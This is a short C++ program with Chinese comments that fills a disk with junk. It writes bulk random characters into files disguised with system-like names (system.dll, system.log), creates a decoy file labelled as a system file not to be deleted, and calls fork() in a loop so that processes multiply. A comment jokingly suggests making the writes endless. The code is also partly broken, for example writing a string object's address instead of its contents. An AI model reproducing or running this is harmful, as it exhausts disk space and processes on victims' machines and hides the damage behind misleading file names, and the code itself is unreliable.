#include <cstdlib>
#import <iostream>
#import <fstream>//文件读写
#import <random>//随机
#import <string>//字符串
#import <thread>//多线程
#import <future>//多线程
#import <unistd.h>
#import <sys/types.h>

using namespace std;
string filename=".";
string foldername;
string str[]={ "system.bin","system.log","system.dat","system.dll"};
random_device rd;
default_random_engine f(rd());
string dir;
string fn="系统文件勿删.txt";
int random_name(){//随机名字
  string temp;


  temp="C:/fill";//这只是个测试请修改此处

  string cmd="mkdir -p " + temp;
  system(cmd.c_str());
  foldername=temp;
  dir=foldername+"/"+filename;
  cout<<foldername<<endl;
  return 0;
}
int write_rom(unsigned int dn){
  char p='a';
  int i,j,k;
  for(auto i=0;i<10000;i++){
    filename=str[f()%4];


    fstream fs(dir,ios::binary | ios::app);
    string dir2=foldername+fn;
    fstream fs2(dir2,ios::out);
    string x;
    x.push_back(p+f()%52);

    for(auto i=0;i<1000;i++)//必须为正数
    {
      fs.write((const char*)&x,x.size());
    }
    fs.close();
  }
  return 0;
}
int pause(){//卡顿
  pid_t id = fork();
  if(id==0){
  }
  return 0;
}

int main()
{
  for(int i=0;i<10;i++){//写入次数建议while循环(滑稽)
    cout<<"isRuning!\n";
    future<int> fu1(async(write_rom,1000));
    future<int> fu2(async(pause));
    fu1.get();
    fu2.get();
  }
  return 0;
}

